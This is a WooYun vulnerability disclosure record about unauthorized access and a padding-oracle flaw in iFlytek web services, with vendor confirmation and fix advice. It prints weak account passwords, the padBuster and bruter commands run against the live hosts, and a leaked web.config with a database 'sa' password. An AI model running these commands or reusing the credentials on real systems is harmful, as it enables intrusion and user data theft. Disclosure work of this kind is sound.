{"id": 86981, "wybug_id": "wooyun-2016-0192208", "wybug_title": "科大讯飞未授权访问&amp;Padding Oracle Vulnerability漏洞,可查看任意用户密码", "wybug_corp": "iflytek.com", "wybug_author": "harbour_bin", "wybug_date": "2016-04-03 21:49", "wybug_open_date": "2016-05-22 09:10", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "未授权访问", "用户敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向公众公开  简要描述： 测试依然在继续... 详细说明：  \nhttp://recordser.iflytek.com/\n#1 未授权访问, 越权至后台\nhttp://recordser.iflytek.com/UserContent/UserContentListhttp://recordser.iflytek.com/UserContent/UserListhttp://recordser.iflytek.com/UserContent/TaskListhttp://recordser.iflytek.com/InspectTask/UserListhttp://recordser.iflytek.com/InspectTask/TaskListhttp://recordser.iflytek.com/App/Index\n简单证明: \n\n\n\n仅证明, 不一一截图了#2 依据未授权的页面, 收集用户帐号(管理员权限即可), Fuzz简单测试后获取弱密码, 其他还有的, 不列出来了\nbaby 123456ylwang9 123456\n管理员权限登陆后台\n\n#3 证明危害可查看任意用户密码普通用户: \n\n管理员, 可先取消管理权限, 再查看密码\n\n细节不在赘叙, 可查看1.7W用户手机号码、籍贯和密码, 提示说录音可换算为酬劳, 那就要重视了录音信息证明: \n\n手机客户端版本: \n\n其他不一一截图了, 你们应该懂得#4 另一个网站\nhttp://ttsexperience.iflytek.com/\n存在开放目录等问题\nhttp://ttsexperience.iflytek.com/ipadVoice/Images/http://ttsexperience.iflytek.com/ipadVoice/css/http://ttsexperience.iflytek.com/ipadVoice/scripts/\n#5 Padding Oracle Vulnerability漏洞\nhttp://ttsexperience.iflytek.com/ipadVoice/Vowels.aspx\n\n\n第一步\npadBuster.pl http://ttsexperience.iflytek.com/ipadVoice/WebResource.axd?d=Nt96HHZbQfgWzOVLGjKfdA2 Nt96HHZbQfgWzOVLGjKfdA2 16 -encoding 3 -plaintext \"|||~/web.config\"\n跑出了第一步\n\n\n\n将第一步的加密地址带入第二步\nbruter.pl http://ttsexperience.iflytek.com/ipadVoice/ScriptResource.axd dBIxytHH8O8dtsHZ2ykNlwAAAAAAAAAAAAAAAAAAAAA1 16\n经过半个小时, 跑出第二步\n\n直接访问\nhttp://ttsexperience.iflytek.com/ipadVoice/ScriptResource.axd?d=FBTli1hthKbzxd2mfBJiMnQSMcrRx_DvHbbB2dspDZcAAAAAAAAAAAAAAAAAAAAA0\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!--  有关如何配置 ASP.NET 应用程序的详细信息，请访问  http://go.microsoft.com/fwlink/?LinkId=169433  --><configuration>  <connectionStrings> <remove name=\"sqlserverConnStr\" />     <add name=\"sqlserverConnStr\" connectionString=\"Data Source=.;Initial Catalog=Recorder;uid=sa;pwd=test@1234;\" providerName=\"System.Data.SqlClient\" />  </connectionStrings>\t<system.web> <compilation debug=\"true\" targetFramework=\"4.0\" />\t\t<pages  enableViewStateMac=\"false\"></pages>    <customErrors mode=\"Off\"/>\t</system.web>    <system.webServer>        <staticContent>            <mimeMap fileExtension=\".mp4\" mimeType=\"application/octet-stream\" />            <mimeMap fileExtension=\".json\" mimeType=\"application/x-javascript\" />        </staticContent>        <defaultDocument>            <files>                <add value=\"index.aspx\" />            </files>        </defaultDocument>    </system.webServer></configuration>\n   漏洞证明：  已证明！   修复方案：  1、Padding Oracle Vulnerability漏洞, 安装微软官方补丁; 2、未授权访问, 进行权限认证; 3、帐号体系控制不严, 对弱密码进行检测, 弱密码比较多;4、安全意识有时候比技术更加重要吧.    版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-07 09:09 厂商回复： 感谢提交，正在安排修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-07 09:23 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:58        | little red pig!)\t\t \n  好老且少见的洞    \n     2016-04-07 09:47 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:68        | 好好提升自己...)\t\t \n  @小红猪 嗯啊, 第一次成功, 忍不住就发了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}